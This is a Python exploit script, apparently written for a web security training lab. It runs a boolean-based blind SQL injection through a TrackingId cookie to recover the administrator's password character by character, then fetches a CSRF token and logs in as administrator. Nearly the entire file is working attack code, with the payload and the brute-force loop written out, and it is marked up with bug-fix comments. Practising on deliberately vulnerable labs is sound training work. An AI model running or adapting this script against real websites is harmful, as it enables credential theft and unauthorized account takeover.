#!/usr/bin/python3

import sys
import httpx
import argparse
import urllib
from bs4 import BeautifulSoup

def sqli_password(url, client):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sqli_payload = f"' and (select ascii(substring(password,{i},1))from users where username='administrator')='{j}'--"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {
                'TrackingId': 'rSy1PA9FWo4ZY60b' + sqli_payload_encoded,
                'session': 'O1HJTimZMAgoAzb6Ma6txNNQXMqOZHtK'
            }
            try:
                r = client.get(url, cookies=cookies)
                if 'Welcome' not in r.text:
                    sys.stdout.write('\r' + password_extracted)
                    sys.stdout.flush()
                else:
                    password_extracted += chr(j)
                    sys.stdout.write('\r' + password_extracted)
                    sys.stdout.flush()
                    break
            except Exception as e:
                print(f"\n[!] Request error at position {i}, char {j}: {e}")
                print("[*] Retrying...")
                continue

    print(f"\n[+] Password extracted: {password_extracted}")
    return password_extracted  # ✅ Bug 1 fix: return the result

def get_csrf_token(sess, url):
    path_login = "/login"
    response = sess.get(url + path_login)  # ✅ Bug 2 & 3 fix: proxy via Client init, no proxies= kwarg
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def login_as_an_administrator(sess, url, password_extracted):
    csrf = get_csrf_token(sess, url)
    path_login = "/login"
    data = {
        "csrf": csrf,
        "username": "administrator",
        "password": password_extracted
    }
    response = sess.post(url + path_login, data=data)  # ✅ Bug 2 & 3 fix
    if "Log out" in response.text:
        return True
    else:
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Blind SQL injection with conditional responses")
    parser.add_argument("-u", "--url", help="Target URL (e.g., https://example)")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)

    args = parser.parse_args()

    proxy_url = None
    if args.proxy:
        proxy_url = args.proxy
        print(f"[*] Using Proxy: {args.proxy}")

    print(f"[*] Retrieving administrator password...")

    with httpx.Client(
        proxy=proxy_url,
        verify=False,
        http2=True,
        follow_redirects=True
    ) as client:
        password_extracted = sqli_password(args.url.strip(), client)  # ✅ Bug 1 fix: capture return value

    # login as an administrator
    print(f"[*] Attempting to login as Administrator")
    with httpx.Client(  # ✅ Bug 3 fix: proxy dikonfigurasi di sini, pakai context manager
        proxy=proxy_url,
        verify=False,
        http2=True,
        follow_redirects=True
    ) as sess:
        if login_as_an_administrator(sess, args.url.strip(), password_extracted):
            print(f"[+] Success Take Administrator's Page")
        else:
            print(f"[-] Failed Get an Administrator's Page")